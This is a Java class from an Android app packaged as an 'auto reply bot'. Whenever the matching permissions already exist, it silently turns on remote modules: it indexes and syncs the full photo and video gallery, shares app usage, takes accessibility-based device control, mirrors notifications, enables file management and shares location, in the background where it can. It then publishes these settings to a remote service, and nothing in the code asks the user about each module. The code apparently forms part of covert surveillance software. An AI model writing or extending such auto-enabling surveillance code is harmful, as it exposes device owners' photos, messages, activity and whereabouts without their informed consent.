package com.autoreplybot.remote;

import android.Manifest;
import android.content.Context;
import android.os.Build;

import androidx.annotation.NonNull;

import java.util.Map;

/**
 * Turns on website-facing module toggles when the matching system access is already
 * granted (e.g. gallery after media permission, usage history after Usage access).
 */
public final class RemoteModuleAutoEnable {
    private RemoteModuleAutoEnable() {}

    /** Sync module flags from current OS grants; publishes when anything changes. */
    public static void syncFromSystemAccess(@NonNull Context context) {
        RemoteModulePrefs modules = new RemoteModulePrefs(context);
        boolean changed = false;

        if (RemotePermissionChecks.hasMediaAccess(context) && !modules.isGalleryEnabled()) {
            modules.setGalleryEnabled(true);
            changed = true;
            new Thread(() -> new RemoteGalleryIndexer(context).indexAndSync("all")).start();
        }

        if (RemoteAppUsageMirror.hasUsageAccess(context) && !modules.isAppUsageSharingEnabled()) {
            modules.setAppUsageSharingEnabled(true);
            changed = true;
            new Thread(() -> RemoteAppUsageMirror.syncRecent(context, 7)).start();
        }

        RemoteAccessibilityPrefs a11yPrefs = new RemoteAccessibilityPrefs(context);
        if (RemoteAppBlockManager.isAccessibilityEnabled(context)
                && !a11yPrefs.isAccessibilityControlEnabled()) {
            a11yPrefs.setAccessibilityControlEnabled(true);
            changed = true;
        }

        if (RemoteAppBlockManager.isAccessibilityEnabled(context) && !modules.isAppControlEnabled()) {
            modules.setAppControlEnabled(true);
            changed = true;
        }

        if (RemotePermissionChecks.hasNotificationListener(context)
                && !modules.isNotificationMirrorEnabled()) {
            modules.setNotificationMirrorEnabled(true);
            changed = true;
            new Thread(() -> RemoteNotificationMirror.syncActive(context)).start();
        }

        if (RemotePermissionChecks.hasFolderAccess(context) && !modules.isFileManagerEnabled()) {
            modules.setFileManagerEnabled(true);
            changed = true;
        }

        if (modules.ensureLocationSharingIfPermitted(context)) {
            if (RemotePermissionChecks.hasBackgroundLocation(context)) {
                modules.setLocationMode(RemoteModulePrefs.MODE_BACKGROUND);
            } else if (RemotePermissionChecks.hasForegroundLocation(context)) {
                modules.setLocationMode(RemoteModulePrefs.MODE_CURRENT_ONLY);
            }
            changed = true;
        }

        if (changed) {
            new RemoteDeviceInfoRepository(context).publishModuleFlags();
        }
    }

    public static void applyRuntimeGrants(@NonNull Context context,
                                          @NonNull RemoteModulePrefs modulePrefs,
                                          @NonNull Map<String, Boolean> result) {
        if (wasMediaGranted(result) && !modulePrefs.isGalleryEnabled()) {
            modulePrefs.setGalleryEnabled(true);
            new RemoteDeviceInfoRepository(context).publishModuleFlags();
            new Thread(() -> new RemoteGalleryIndexer(context).indexAndSync("all")).start();
        }
    }

    private static boolean wasMediaGranted(@NonNull Map<String, Boolean> result) {
        if (Build.VERSION.SDK_INT >= 33) {
            return Boolean.TRUE.equals(result.get(Manifest.permission.READ_MEDIA_IMAGES))
                    || Boolean.TRUE.equals(result.get(Manifest.permission.READ_MEDIA_VIDEO))
                    || Boolean.TRUE.equals(result.get(Manifest.permission.READ_MEDIA_AUDIO));
        }
        return Boolean.TRUE.equals(result.get(Manifest.permission.READ_EXTERNAL_STORAGE));
    }
}
